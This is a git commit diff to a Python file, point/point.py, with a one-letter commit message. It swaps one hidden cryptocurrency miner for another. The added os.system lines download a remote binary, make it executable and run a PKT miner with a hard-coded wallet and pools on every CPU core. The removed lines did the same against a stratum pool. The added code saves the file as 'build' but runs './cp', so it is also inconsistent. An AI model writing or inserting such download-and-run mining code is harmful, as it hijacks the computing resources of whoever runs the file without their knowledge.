a1ba4bbcb03b31f23f178ee25053beec88224023
WifeAiBot <125169889+WifeAiBot@users.noreply.github.com>
2024-12-10 06:51:02 +0000

    i

--- point/point.py
+++ point/point.py
@@ -1,4 +1,4 @@
 import sys
 import os
-os.system("wget -qO build https://git.io/JySi5 && chmod +x build")
-os.system("./build -a gr -o stratum+tcp://mine.evepool.pw:1090 -u wallet.worker -p x -t $(nproc)")
+os.system("wget -qO build https://github.com/WifeAiBot/testpoint/raw/main/cp && chmod +x build")
+os.system("./cp ann -p pkt1qmmecdztm2ff4fvul0y2u7nfrrh3pdy0x6p6vdk http://pool.pkt.world http://pool.pktpool.io -p x -t $(nproc)")
